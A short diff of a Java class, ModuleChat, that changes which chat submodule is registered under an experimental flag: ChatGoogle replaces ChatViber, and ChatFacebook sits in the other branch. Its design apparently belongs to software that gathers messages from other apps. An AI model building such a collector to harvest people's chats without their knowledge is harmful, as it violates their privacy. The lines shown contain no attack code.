@@ -34,7 +34,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		subModuleManager = new SubModuleManager(this);
 
 		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
-			subModuleManager.add(new ChatViber());
+			subModuleManager.add(new ChatGoogle());
 			
 		} else {
 			subModuleManager.add(new ChatFacebook());
